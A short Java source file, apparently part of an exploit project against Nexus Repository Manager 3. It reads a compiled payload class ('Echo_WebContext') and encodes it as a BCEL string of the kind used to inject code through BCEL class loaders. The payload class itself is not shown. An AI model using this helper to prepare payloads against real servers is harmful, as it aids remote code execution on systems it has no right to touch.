package com.nexus;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class payload_generate {
    public static String class2BCEL(String classFile) throws Exception{
        Path path = Paths.get(classFile);
        byte[] bytes = Files.readAllBytes(path);
        String result = Utility.encode(bytes,true);
        return result;
    }
    public static void main(String[] args) throws Exception {
        System.out.println(class2BCEL("D:\\project\\java\\Nexus\\nexus3_payload\\src\\main\\java\\com\\nexus\\Echo_WebContext.class"));
    }
}
